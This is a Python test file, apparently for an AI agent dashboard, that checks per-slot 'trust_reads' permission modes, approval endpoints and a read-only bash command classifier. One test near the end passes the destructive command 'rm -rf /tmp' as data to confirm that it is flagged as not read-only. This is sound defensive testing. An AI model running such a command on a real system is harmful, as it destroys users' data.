        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[str] = loop.create_future()
        slot._approval_futures["test"] = fut

        async with TestClient(TestServer(_make_app(state))) as client:
            resp = await client.post("/api/chat/slots/s1/approve", json={"action": "trust_reads"})
            data = await resp.json()
            assert data["ok"] is True
            # trust_reads is deferred — set by main loop after future consumed
            assert slot._trust_reads is False
            assert slot._trust is False
            assert fut.result() == "approved_trust_reads"

    @pytest.mark.asyncio
    async def test_trust_reads_mode_endpoint(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")

        async with TestClient(TestServer(_make_app(state))) as client:
            resp = await client.post("/api/chat/mode", json={"mode": "trust_reads", "slot": "s1"})
            data = await resp.json()
            assert resp.status == 200
            assert data["ok"] is True
            assert slot._trust_reads is True
            assert slot._trust is False

    @pytest.mark.asyncio
    async def test_normal_mode_resets_trust_reads(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")
        slot._trust_reads = True

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "normal", "slot": "s1"})
            assert slot._trust_reads is False
            assert slot._trust is False


# ── Slot to_dict includes trust_reads ──


class TestSlotTrustReadsDict:
    def test_trust_reads_in_to_dict(self):
        slot = _ChatSlot("s1")
        d = slot.to_dict()
        assert "trust_reads" in d
        assert d["trust_reads"] is False

    def test_trust_reads_true_in_to_dict(self):
        slot = _ChatSlot("s1")
        slot._trust_reads = True
        d = slot.to_dict()
        assert d["trust_reads"] is True
        assert d["trust"] is False


# ── Spawn endpoint trust validation ──


# ── Mode endpoint: trust_reads without slot ──


class TestTrustReadsModeAllSlots:
    @pytest.mark.asyncio
    async def test_trust_reads_all_slots(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        s1 = state.get_or_create_slot("s1")
        s2 = state.get_or_create_slot("s2")

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "trust_reads"})
            assert s1._trust_reads is True
            assert s2._trust_reads is True
            assert s1._trust is False

    @pytest.mark.asyncio
    async def test_normal_resets_all_slots(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        s1 = state.get_or_create_slot("s1")
        s2 = state.get_or_create_slot("s2")
        s1._trust_reads = True
        s2._trust_reads = True

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "normal"})
            assert s1._trust_reads is False
            assert s2._trust_reads is False


# ── Permission metadata: is_read_only flag ──


class TestPermissionMetadata:
    def test_perm_meta_is_read_only_set(self):
        """Verify _extract_bash_command + is_read_only_bash integration."""
        import json

        tool_input = json.dumps({"command": "ls -la"})
        cmd = _extract_bash_command(tool_input)
        assert cmd == "ls -la"
        assert is_read_only_bash(cmd) is True

    def test_perm_meta_write_not_read_only(self):
        import json

        tool_input = json.dumps({"command": "rm -rf /tmp"})
        cmd = _extract_bash_command(tool_input)
        assert cmd == "rm -rf /tmp"
        assert is_read_only_bash(cmd) is False

    def test_perm_meta_empty_tool_input(self):
        cmd = _extract_bash_command("")
        assert cmd == ""
